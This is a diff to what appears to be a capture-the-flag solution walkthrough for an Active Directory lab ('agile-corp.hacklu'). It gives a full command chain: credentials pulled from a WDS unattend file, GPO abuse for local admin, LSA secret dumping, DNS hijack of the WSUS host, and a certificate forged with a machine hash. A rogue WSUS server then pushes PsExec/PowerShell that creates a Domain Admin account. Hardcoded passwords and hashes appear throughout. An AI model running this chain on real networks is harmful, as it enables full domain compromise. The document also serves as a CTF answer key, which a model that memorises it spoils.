@@ -16,22 +16,23 @@
 1. `nxc smb SRV -u guest -p '' --share REMINST --get-file 'WdsClientUnattend\ImageUnattend.xml' ImageUnattend.xml`
 2. `nxc smb SRV -u svc_deploy -p 'D3pl0y!_AgileCorp'`
 3. `pipx inject netexec ldap3-bleeding-edge`
-4. `nxc ldap DC -u svc_deploy -p 'D3pl0y!_AgileCorp' --bloodhound -c all --dns-server DC`
-5. `pygpoabuse 'agile-corp.hacklu/svc_deploy:D3pl0y!_AgileCorp' -gpo-id "5889E490-F649-4B0C-AF73-5220803E133C" -dc-ip 10.244.0.10 -vv -command 'net localgroup "Administrators" "agile-corp.hacklu\svc_deploy" /add'`
-7. `nxc smb SRV -u svc_deploy -p 'D3pl0y!_AgileCorp' --lsa`
-8. `nxc ldap DC -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
-9. Update WSUS DNS entry (first update hosts file): `nsupdate`
-   1. `nsupdate`
-   2. `server agile-corp.hacklu`
-   3. `zone agile-corp.hacklu`
-   4. `update add wsus.agile-corp.hacklu. 86400 A 10.244.2.2`
-   5. `update delete wsus.agile-corp.hacklu. A 172.16.10.10`
-   6. `send`
-10. `certipy req -dc-ip 10.244.0.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
-11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
-12. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only`
-13. Wait up to 1 minute for WSUS updates on the DC.
-14. `nxc smb DC -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
+4. `nxc ldap DC -u svc_deploy -p 'D3pl0y!_AgileCorp' --bloodhound -c all --dns-server 10.244.0.10`
+5. `pygpoabuse 'agile-corp.hacklu/svc_deploy:D3pl0y!_AgileCorp' -gpo-id "D3196948-B05A-4CFC-A4AA-534417B76E06" -dc-ip 10.244.0.10 -vv -command 'net localgroup "Administrators" "agile-corp.hacklu\svc_deploy" /add'`
+7. `nxc smb 192.168.109.20 -u svc_deploy -p 'D3pl0y!_AgileCorp' --lsa`
+8. `sudo wsuks -u svc_deploy -p 'D3pl0y!_AgileCorp' -d agile-corp.hacklu --dc-ip 10.244.0.10 --only-discover`
+9. `nxc ldap DC -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
+10. Update WSUS DNS entry (first update hosts file): `nsupdate`
+    1.  `nsupdate`
+    2.  `server agile-corp.hacklu`
+    3.  `zone agile-corp.hacklu`
+    4.  `update add wsus.agile-corp.hacklu. 86400 A 10.244.2.2`
+    5.  `update delete wsus.agile-corp.hacklu. A 172.16.10.10`
+    6.  `send`
+11. `certipy req -dc-ip 10.244.0.10 -u SRV$ -hashes 7e4f65f8776fabe11d9e72deb0401a6e -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
+12. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
+13. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only -c 'PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true; Add-ADGroupMember -Identity \"Domain Admins\" -Members user89834"'`
+14. Wait up to 1 minute for WSUS updates on the DC.
+15. `nxc smb DC -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
 
 
 #### Manual invocations
